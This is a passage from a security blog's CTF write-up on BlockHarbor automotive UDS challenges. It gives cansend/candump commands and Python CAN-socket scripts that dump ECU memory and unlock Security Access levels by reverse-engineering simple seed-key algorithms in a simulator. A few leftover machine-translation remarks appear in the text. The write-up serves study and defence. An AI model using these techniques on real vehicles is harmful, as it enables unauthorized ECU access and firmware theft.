id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.</p><p>The site is broadly composed of two parts: the <a href="https://proving-grounds.blockharbor.io/">CTF Problem Site</a>, which is built on the CTFd platform, and the <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &#x201C;Getting Started&#x201D; problems on the CTF problem site.</p><p><img src="image07.png" alt="image07.png"></p><p>When you connect to <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.</p><p><img src="image08.png" alt="image08.png"></p><p>When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&#x2019;ve identified within this environment.</p><h3 id="2-1-tmux-setting"><a href="#2-1-tmux-setting" class="headerlink" title="2.1 tmux setting"></a>2.1 tmux setting</h3><p>To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux introduction</a> via their landing page. I will explain a few of the frequently used commands from that guide.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>You didn&#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:</p><p>The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux intro</a> or search online.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> used to solve the problems can be found in the documentation introduced earlier.</p><p>Let&#x2019;s start solving the problems right away!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.</p><p>The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.</p><p><img src="image12.png" alt="image12.png"></p><p>The translation is:</p><p>First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>Let&#x2019;s examine the received message in detail.</p><p>Upon making the Read Data By Identifier request (<code>22</code>), we can confirm the correct RSID (<code>62</code>) response. Following this, a large amount of data is returned, and continuous values like <code>21</code> and <code>22</code> are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). </p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using <code>7DF</code>.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>The simple way to Restart the ECU is to send a Reset request (<code>11</code>). For the Reset request used in this problem, we use the Default Session (<code>01</code>) Sub Function Byte. Because of this, no separate DID is used. </p><p>When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (<code>51</code>). Subsequently, you can also obtain the flag information!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically <code>Pxxxx-xx</code>.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>The problem can be solved by sending a Read DTC Information request (<code>19</code>). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the <a href="https://buly.kr/2UjxlRq">AUTOSAR documentation</a>.</p><p>The confirmed DTC is <code>P3E9F-01</code>. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> document, to understand how to interpret the DTC code.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>This problem requires a Read Memory By Address request. The accessible memory area is stated to start from <code>0xC3F80000</code>.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>Data in memory can be read using a memory read request (<code>23</code>).</p><p>A point to note here is that you must calculate and use the value (<code>14</code>) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">this video</a>. Consequently, reading is possible by sending a read request for 255 (<code>FF</code>) bytes using the value <code>14</code>, which requests the use of a 4-byte address and 1-byte length format.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>Through the code above, data in the <code>0xC3F83000</code> range can be parsed.</p><p>Although the Python <code>can</code> module is typically used for CAN communication, it is unavailable in a simulation environment&#x2026; Therefore, it was written using the <code>socket</code> module as a replacement.</p><p>When representing the CAN format with the Python <code>socket</code> module, the argument <code>=IB3x8s</code> must be provided.</p><p><img src="image20.png" alt="image20.png"></p><p>The flag present in memory can be confirmed by executing the code.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>First, let&#x2019;s look at the Security Access function provided by UDS.</p><p>Security Access is a service that controls access rights to the ECU. It&#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID <code>27</code> after first changing to the Extended Diagnostic Session (<code>10</code> - <code>03</code>).</p><p>A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>Authentication for Level 3 can be performed according to the Security Access authentication sequence.</p><p>First, after changing to the Extended Diagnostic Session (<code>1030</code>), the seed value <code>7E53</code> generated by the Security Access Level 3 request (<code>2703</code>) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (<code>67</code>).</p><p>The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of <code>0x1337 ^ 0xFFFF</code>.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the <code>0x1A000</code> range. The flag is the key value for the seed <code>0x7D0E1A5C</code>. It is known that the seed and key lengths for Level 1 are 4 bytes.</p><p>Oddly, in this UDS Challenge, Level 1 is placed after Level 3.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>First, write the code to perform a read operation on the memory in the <code>0x1A000</code> region.</p><p><img src="image26.png" alt="image26.png"></p><p>Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.</p><p>After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>It can be seen that performing an XOR operation on those values results in a fixed value of <code>0x5539aa17</code>.</p><p>Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is <code>seed ^ 0x5539aa17</code>.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (<code>67</code>).</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>The code to unlock Security Access Level 1 can also be written.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-CVEs-occurring-due-to-UDS-commands"><a href="#4-CVEs-occurring-due-to-UDS-commands" class="headerlink" title="4. CVEs occurring due to UDS commands"></a>4. CVEs occurring due to UDS commands</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>, which occurred in the Nissan Altima.</p><p>CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.</p><p>Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (<code>22</code>) and various Diagnostic Requests (<code>19</code>, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (<code>27</code>) bypass. In particular, if validation for Read Memory By Address Request (<code>23</code>) is inadequate, the firmware can be leaked through internal memory access.</p><p>Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.</p><p>Next time, I will return with a different embedded topic! Thank you! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] BlockHarbor CTF와 CVE로 알아보는 CAN / UDS 취약점 (KR)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
